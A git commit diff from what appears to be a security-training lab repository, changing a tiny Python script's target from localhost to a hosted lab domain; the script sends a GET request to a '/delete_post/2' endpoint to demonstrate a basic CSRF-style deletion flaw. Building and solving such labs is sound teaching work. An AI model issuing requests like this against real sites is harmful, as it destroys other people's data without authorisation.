f3733390522d2baad916ff435c07a9b8af9246e2
Laplas <61288992+Laplas00@users.noreply.github.com>
2025-07-03 20:54:58 +0300

    n

--- vps-labs-api/__crack_scripts__/basic_csrf_post_deletion.py
+++ vps-labs-api/__crack_scripts__/basic_csrf_post_deletion.py
@@ -1,6 +1,6 @@
 import requests
 from icecream import ic
 
-r = requests.get('http://0.0.0.0:8000/delete_post/2')
+r = requests.get('http://lap3-basic_csrf.labs-is-here.online/delete_post/2')
 
 ic(r.text)
